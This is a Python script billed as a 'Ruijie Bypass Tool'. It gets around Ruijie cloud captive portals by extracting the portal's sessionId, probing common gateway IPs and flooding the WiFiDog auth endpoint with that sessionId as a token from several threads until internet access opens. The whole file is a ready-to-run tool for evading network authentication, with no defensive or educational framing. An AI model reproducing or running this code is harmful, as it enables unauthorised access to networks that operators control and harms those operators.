#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Ruijie Bypass Tool v2 - Cloud Edition
Fixed for Cloud Portal Redirects
"""

import requests
import re
import urllib3
import time
import threading
import logging
import random
import os
from urllib.parse import urlparse, parse_qs, urljoin

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ===============================
# CONFIG
# ===============================
PING_THREADS = 5
MIN_INTERVAL = 0.05
MAX_INTERVAL = 0.2
DEBUG = False

# ===============================
# COLORS
# ===============================
RED = "\033[0;31m"
GREEN = "\033[0;32m"
CYAN = "\033[0;36m"
YELLOW = "\033[0;33m"
MAGENTA = "\033[0;35m"
RESET = "\033[00m"

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s | %(message)s",
    datefmt="%H:%M:%S"
)

stop_event = threading.Event()

def check_real_internet():
    try:
        # Check standard google 204 to verify internet
        r = requests.get("http://connectivitycheck.gstatic.com/generate_204", timeout=3)
        return r.status_code == 204
    except:
        return False

def banner():
    print(f"""{MAGENTA}
╔══════════════════════════════════════╗
║     Ruijie Bypass Tool v2 (FIXED)    ║
║     Cloud Portal & Session ID Fix    ║
╚══════════════════════════════════════╝
{RESET}""")

def high_speed_ping(auth_link, sid):
    session = requests.Session()
    ping_count = 0
    success_count = 0

    while not stop_event.is_set():
        try:
            start = time.time()
            r = session.get(auth_link, timeout=5)
            elapsed = (time.time() - start) * 1000

            ping_count += 1
            success_count += 1

            color = GREEN if elapsed < 100 else YELLOW
            print(f"{color}[✓]{RESET} SID {sid[:8]}... | Ping: {elapsed:.1f}ms | OK: {success_count}", end="\r")

        except Exception:
            ping_count += 1
            print(f"{RED}[X]{RESET} SID {sid[:8]}... | Reconnecting...             ", end="\r")

        time.sleep(random.uniform(MIN_INTERVAL, MAX_INTERVAL))

def start_process():
    os.system('clear' if os.name == 'posix' else 'cls')
    banner()

    logging.info(f"{CYAN}Initializing Engine...{RESET}")

    while not stop_event.is_set():
        session = requests.Session()
        test_url = "http://connectivitycheck.gstatic.com/generate_204"

        try:
            r = session.get(test_url, allow_redirects=True, timeout=5)

            if r.status_code == 204:
                print(f"{GREEN}[✓] Internet is already active. Checking again in 10s...{RESET}", end="\r")
                time.sleep(10)
                continue

            portal_url = r.url
            print(f"\n{CYAN}[*] Portal Detected: {portal_url}{RESET}")

            # STEP 1 - Advanced SID Extraction
            # Try from URL first
            parsed_url = urlparse(portal_url)
            params = parse_qs(parsed_url.query)
            sid = params.get('sessionId', [None])[0]

            if not sid:
                # Try from Page Content
                r_page = session.get(portal_url, verify=False)
                sid_match = re.search(r'sessionId=([a-zA-Z0-9]+)', r_page.text)
                if sid_match:
                    sid = sid_match.group(1)

            if not sid:
                logging.warning(f"{RED}Session ID Not Found. Searching deeper...{RESET}")
                time.sleep(3)
                continue

            print(f"{GREEN}[✓]{RESET} Session ID Captured: {sid}")

            # STEP 2 - Detect Gateway IP
            # Usually from gw_address param, if not, use common defaults
            gw_addr = params.get('gw_address', ['192.168.1.1'])[0]
            gw_port = params.get('gw_port', ['2060'])[0]
            
            # If gw_address is not in URL, try to guess from common Ruijie setups
            if gw_addr == '192.168.1.1' and 'ruijienetworks.com' in portal_url:
                # Common Ruijie Gateway IPs
                for test_ip in ['192.168.110.1', '192.168.60.1', '10.1.1.1']:
                    print(f"{YELLOW}[*] Testing Gateway IP: {test_ip}{RESET}", end="\r")
                    try:
                        t_res = requests.get(f"http://{test_ip}:{gw_port}/wifidog/", timeout=1)
                        if t_res.status_code < 500:
                            gw_addr = test_ip
                            break
                    except: continue

            # STEP 3 - Build Auth Link (WiFiDog Protocol)
            auth_link = f"http://{gw_addr}:{gw_port}/wifidog/auth?token={sid}"

            print(f"\n{MAGENTA}[*] Launching Turbo Threads...{RESET}")
            print(f"{CYAN}[*] Gateway: {gw_addr}:{gw_port}{RESET}")

            threads = []
            for i in range(PING_THREADS):
                t = threading.Thread(target=high_speed_ping, args=(auth_link, sid), daemon=True)
                t.start()
                threads.append(t)

            while not stop_event.is_set():
                if check_real_internet():
                    print(f"\n{GREEN}[SUCCESS] Connected to Internet! Keep running to maintain session.{RESET}")
                time.sleep(10)

        except KeyboardInterrupt:
            stop_event.set()
            break
        except Exception as e:
            if DEBUG: print(f"Error: {e}")
            time.sleep(5)

if __name__ == "__main__":
    try:
        start_process()
    except KeyboardInterrupt:
        stop_event.set()
        print(f"\n{RED}Stopping Engine...{RESET}")
